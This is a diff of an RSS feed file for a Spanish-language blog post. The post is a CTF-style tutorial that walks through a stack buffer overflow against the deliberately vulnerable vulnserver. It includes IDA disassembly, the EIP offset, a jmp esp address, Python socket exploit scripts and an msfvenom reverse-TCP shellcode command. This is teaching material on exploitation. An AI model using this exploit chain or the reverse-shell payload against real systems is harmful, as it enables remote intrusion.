@@ -1,29 +1,27 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Bufferoverflow on pacodiazdg.github.io</title>
-    <link>https://pacodiazdg.github.io/tags/bufferoverflow/</link>
-    <description>Recent content in Bufferoverflow on pacodiazdg.github.io</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
-    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="https://pacodiazdg.github.io/tags/bufferoverflow/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title> Que es un buffer overflow (vulnserver) (CFT)</title>
-      <link>https://pacodiazdg.github.io/posts/que-es-un-buffer-overflow-vulnserver-cft/</link>
-      <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
-      
-      <guid>https://pacodiazdg.github.io/posts/que-es-un-buffer-overflow-vulnserver-cft/</guid>
-      <description>En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.
-Los dos programas que se van a ocupar son:</description>
-      <content>&lt;p&gt;En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.&lt;/p&gt;
+    <channel>
+        <title>Bufferoverflow on pacodiazdg.github.io</title>
+        <link>http://10.10.8.69:1313/tags/bufferoverflow/</link>
+        <description>Recent content in Bufferoverflow on pacodiazdg.github.io</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>es-es</language>
+        <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="http://10.10.8.69:1313/tags/bufferoverflow/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title> Que es un buffer overflow (vulnserver) (CFT)</title>
+        <link>http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft/</link>
+        <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
+        
+        <guid>http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft/</guid>
+        <description>&lt;img src="https://i.imgur.com/TkhMSIZ.png" alt="Featured image of post  Que es un buffer overflow (vulnserver) (CFT)" /&gt;&lt;p&gt;En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.&lt;/p&gt;
 &lt;p&gt;Los dos programas que se van a ocupar son:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;x64dbg&lt;/li&gt;
 &lt;li&gt;IDA&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/stephenbradshaw/vulnserver&#34;&gt;https://github.com/stephenbradshaw/vulnserver&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/stephenbradshaw/vulnserver&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/stephenbradshaw/vulnserver&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;que-es-un-bufferoverflow&#34;&gt;Que es un bufferoverflow?&lt;/h3&gt;
-&lt;p&gt;bufferoverflow se produce cuando se colocan más datos en un búfer de longitud fija de los que el búfer puede manejar.
+&lt;h3 id=&#34;que-es-un-bufferoverflow&#34;&gt;Que es un bufferoverflow?
+&lt;/h3&gt;&lt;p&gt;bufferoverflow se produce cuando se colocan más datos en un búfer de longitud fija de los que el búfer puede manejar.
 en este caso en la función buffer tiene una variable de tamaño 5 y nuestra cadena tiene una longitud mayora a eso por lo que los datos restantes van a sobre escribir el stack&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
@@ -37,13 +35,31 @@ en este caso en la función buffer tiene una variable de tamaño 5 y nuestra cad
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Vulnerable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;buffer&lt;/span&gt;(Vulnerable);
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;enter image description here&#34; src=&#34;https://i.imgur.com/d7syZFV.png&#34;&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/d7syZFV.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;enter image description here&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;si compilamos y depuramos vemos que el EIP (puntero de instrucción) no tiene una dirección si no puras &amp;ldquo;aaaa&amp;rdquo; en hax&lt;/p&gt;
-&lt;h3 id=&#34;encontrar-la-funcion-vulnerable&#34;&gt;Encontrar la funcion vulnerable&lt;/h3&gt;
-&lt;p&gt;para explotar el buffer overflow en vulnserver sin protecciones es bastante fácil&lt;/p&gt;
+&lt;h3 id=&#34;encontrar-la-funcion-vulnerable&#34;&gt;Encontrar la funcion vulnerable
+&lt;/h3&gt;&lt;p&gt;para explotar el buffer overflow en vulnserver sin protecciones es bastante fácil&lt;/p&gt;
 &lt;p&gt;en este caso remiendo hacer un análisis estático del programa esto es más fácil si se hace desde IDA, el modo grafico nos va a ser de gran ayuda en estos casos para darle seguiento a las funciones&lt;/p&gt;
 &lt;p&gt;esta es la función de bienvenida por lo que hay que continuar para ver si hay algún comando vulnerable&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;enter image description here&#34; src=&#34;https://i.imgur.com/6pw7YUX.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/6pw7YUX.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;enter image description here&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;en este caso la funcion3 es candidata para ser explotada y es llamada por varios comandos, pero más especialmente por TRUN ya es la más fácil&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401808                 push    ebp
 .text:00401809                 mov     ebp, esp
@@ -90,21 +106,58 @@ en este caso en la función buffer tiene una variable de tamaño 5 y nuestra cad
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (reply)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo que buscamos es que se sobrescriba el ESP y después el EIP y como era de esperarse si se sobre escribió el EIP contiene 616161&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;enter image description here&#34; src=&#34;https://i.imgur.com/TkhMSIZ.png&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;explotacion-cantidad-de-bytes-necesarios&#34;&gt;Explotacion (cantidad de bytes necesarios)&lt;/h3&gt;
-&lt;p&gt;vamos a contar la cantidad bytes que se necesitan para llegar a esp y no sobrescribirlo en este caso recomiendo poner números aleatorios&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4kBsKSF.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TkhMSIZ.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;enter image description here&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;explotacion-cantidad-de-bytes-necesarios&#34;&gt;Explotacion (cantidad de bytes necesarios)
+&lt;/h3&gt;&lt;p&gt;vamos a contar la cantidad bytes que se necesitan para llegar a esp y no sobrescribirlo en este caso recomiendo poner números aleatorios&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4kBsKSF.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;lo vamos a ejecutar para obtener la cantidad de bytes necesarios para sobrescribir el EIP&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4kIbqVz.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4kIbqVz.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;invertimos el orden (Endianness)&lt;/p&gt;
 &lt;p&gt;30 54 68 37 == 37 68 54 30 == 7hT0&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/3HGhosz.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/3HGhosz.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;buscamos en el texto y obtenemos que se ocupan 2005 bytes para evitar sobrescribir el EIP&lt;/p&gt;
-&lt;h3 id=&#34;explotacion-jmp-esp&#34;&gt;Explotacion (jmp esp)&lt;/h3&gt;
-&lt;p&gt;vamos a buscar alguna instrucción que nos pueda ayudar a ejecutar el contenido en ESP como por ejemplo jmp esp&lt;/p&gt;
+&lt;h3 id=&#34;explotacion-jmp-esp&#34;&gt;Explotacion (jmp esp)
+&lt;/h3&gt;&lt;p&gt;vamos a buscar alguna instrucción que nos pueda ayudar a ejecutar el contenido en ESP como por ejemplo jmp esp&lt;/p&gt;
 &lt;p&gt;search in &amp;ndash;&amp;gt; all modules &amp;ndash;&amp;gt; find command&lt;/p&gt;
 &lt;p&gt;buscamos  jmp esp&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/AfCAzDz.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/AfCAzDz.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Address=625011AF
 Disassembly=jmp esp&lt;/p&gt;
 &lt;p&gt;esto lo mandamos a EIP lo invetimos (Endianness)&lt;/p&gt;
@@ -137,9 +190,10 @@ Disassembly=jmp esp&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (reply)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;explotacion-shellcode-calc-y-bad-characters&#34;&gt;Explotacion (Shellcode calc) y Bad Characters&lt;/h3&gt;
-&lt;p&gt;pueden usar exploitdb para buscar una shellcode calc o usar msfvenom en mi caso voy a usar exploitdb, una cosa que hay que tener en cuenta son los &amp;ldquo;Bad Characters&amp;rdquo; como mencione la función strcpy busca bytes nulos para terminar por lo que si nuestra sellcode tiene algun \x00 no va a completar la shellcode y no va a funcionar uno de los métodos mas usados en msvenom es -b &lt;code&gt;msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.109 LPORT=4444  -f c     -b &#39;\x00&#39;&lt;/code&gt; donde estoy borrando bytes nulos.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/48116&#34;&gt;https://www.exploit-db.com/exploits/48116&lt;/a&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;explotacion-shellcode-calc-y-bad-characters&#34;&gt;Explotacion (Shellcode calc) y Bad Characters
+&lt;/h3&gt;&lt;p&gt;pueden usar exploitdb para buscar una shellcode calc o usar msfvenom en mi caso voy a usar exploitdb, una cosa que hay que tener en cuenta son los &amp;ldquo;Bad Characters&amp;rdquo; como mencione la función strcpy busca bytes nulos para terminar por lo que si nuestra sellcode tiene algun \x00 no va a completar la shellcode y no va a funcionar uno de los métodos mas usados en msvenom es -b &lt;code&gt;msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.109 LPORT=4444  -f c     -b &#39;\x00&#39;&lt;/code&gt; donde estoy borrando bytes nulos.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/48116&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.exploit-db.com/exploits/48116&lt;/a&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys	
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
@@ -167,9 +221,16 @@ Disassembly=jmp esp&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (reply)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/63BReCz.png&#34;&gt;&lt;/p&gt;
-</content>
-    </item>
-    
-  </channel>
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/63BReCz.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
 </rss>
